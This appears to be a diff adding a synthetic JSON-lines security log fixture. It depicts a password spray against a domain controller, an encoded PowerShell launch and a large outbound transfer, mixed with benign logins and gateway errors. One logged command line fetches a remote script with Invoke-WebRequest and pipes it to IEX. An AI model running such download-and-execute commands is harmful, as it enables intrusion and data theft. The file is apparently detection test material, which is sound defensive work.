@@ -1,0 +1,21 @@
+{"timestamp":"2026-11-22T10:00:00Z","event_id":4624,"host":"FIN-WS-017","user":"kyle.test","src_ip":"192.0.2.10","message":"Successful interactive login to analyst workstation","level":"INFO"}
+{"timestamp":"2026-11-22T10:01:00Z","event_id":4688,"host":"FIN-WS-017","user":"kyle.test","process":"notepad.exe","message":"Interactive application started","level":"INFO"}
+{"timestamp":"2026-11-22T10:02:00Z","event_id":4625,"host":"AUTH-DC-01","user":"alexa","src_ip":"203.0.113.77","message":"Account failed to log on","level":"WARNING"}
+{"timestamp":"2026-11-22T10:02:20Z","event_id":4625,"host":"AUTH-DC-01","user":"brian","src_ip":"203.0.113.77","message":"Account failed to log on","level":"WARNING"}
+{"timestamp":"2026-11-22T10:02:40Z","event_id":4625,"host":"AUTH-DC-01","user":"chris","src_ip":"203.0.113.77","message":"Account failed to log on","level":"WARNING"}
+{"timestamp":"2026-11-22T10:03:00Z","event_id":4625,"host":"AUTH-DC-01","user":"devon","src_ip":"203.0.113.77","message":"Account failed to log on","level":"WARNING"}
+{"timestamp":"2026-11-22T10:03:20Z","event_id":4625,"host":"AUTH-DC-01","user":"alexa","src_ip":"203.0.113.77","message":"Account failed to log on","level":"WARNING"}
+{"timestamp":"2026-11-22T10:03:40Z","event_id":4625,"host":"AUTH-DC-01","user":"brian","src_ip":"203.0.113.77","message":"Account failed to log on","level":"WARNING"}
+{"timestamp":"2026-11-22T10:04:00Z","event_id":4625,"host":"AUTH-DC-01","user":"chris","src_ip":"203.0.113.77","message":"Account failed to log on","level":"WARNING"}
+{"timestamp":"2026-11-22T10:04:20Z","event_id":4625,"host":"AUTH-DC-01","user":"devon","src_ip":"203.0.113.77","message":"Account failed to log on","level":"WARNING"}
+{"timestamp":"2026-11-22T10:04:45Z","event_id":4624,"host":"AUTH-DC-01","user":"alexa","src_ip":"203.0.113.77","message":"Successful network authentication after multiple failures","level":"INFO"}
+{"timestamp":"2026-11-22T10:05:00Z","event_id":4688,"host":"FIN-WS-017","user":"kyle.test","process":"powershell.exe","command_line":"powershell.exe -NoP -EncodedCommand SQBFAFgA","message":"Suspicious encoded PowerShell command launched","level":"WARNING"}
+{"timestamp":"2026-11-22T10:05:20Z","event_id":4104,"host":"FIN-WS-017","user":"kyle.test","process":"powershell.exe","command_line":"Invoke-WebRequest http://198.51.100.24/tools/agent.ps1 | IEX","message":"PowerShell ScriptBlock with remote code invocation","level":"WARNING"}
+{"timestamp":"2026-11-22T10:06:30Z","event_id":3,"host":"FIN-WS-017","user":"kyle.test","process":"powershell.exe","dest_ip":"198.51.100.24","bytes_out":152043520,"message":"Large outbound transfer from PowerShell process","level":"WARNING"}
+{"timestamp":"2026-11-22T10:08:00Z","event_id":4624,"host":"ENG-WS-005","user":"employee","src_ip":"192.0.2.12","message":"Normal user sign-in","level":"INFO"}
+{"timestamp":"2026-11-22T10:09:00Z","event_id":1000,"host":"APP-API-01","service":"gateway","status":503,"message":"Backend timeout connecting to upstream","level":"ERROR"}
+{"timestamp":"2026-11-22T10:09:02Z","event_id":1000,"host":"APP-API-01","service":"gateway","status":503,"message":"Backend timeout connecting to upstream","level":"ERROR"}
+{"timestamp":"2026-11-22T10:09:04Z","event_id":1000,"host":"APP-API-01","service":"gateway","status":500,"message":"Request aborted by backend","level":"ERROR"}
+{"timestamp":"2026-11-22T10:09:06Z","event_id":1000,"host":"APP-API-01","service":"gateway","status":503,"message":"Backend timeout connecting to upstream","level":"ERROR"}
+{"timestamp":"2026-11-22T10:09:08Z","event_id":1000,"host":"APP-API-01","service":"gateway","status":503,"message":"Backend timeout connecting to upstream","level":"ERROR"}
+{"timestamp":"2026-11-22T10:10:00Z","event_id":4624,"host":"ENG-WS-005","user":"employee","src_ip":"192.0.2.12","message":"Normal authentication","level":"INFO"}
